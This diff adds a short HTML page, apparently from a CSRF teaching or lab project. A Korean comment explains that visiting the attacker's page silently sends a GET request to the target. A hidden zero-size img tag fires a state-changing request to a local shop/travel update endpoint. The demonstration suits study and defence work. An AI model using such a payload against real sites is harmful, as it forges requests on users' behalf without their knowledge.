@@ -1,0 +1,20 @@
+<!-- csrf_attack/csrf_attack_using_img.html -->
+
+<!doctype html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8" />
+    <title>CSRF Attack (img tag)</title>
+</head>
+<body>
+
+<p>
+    공격자 사이트의 웹페이지에 접속하면, 그 즉시 타겟 사이트로의 GET 요청이 사용자 모르게 전달됩니다.
+</p>
+
+<img src="http://localhost:8000/shop/travel/current/update/?src=Bali&dest=Korea"
+     width="0"
+     height="0" />
+
+</body>
+</html>
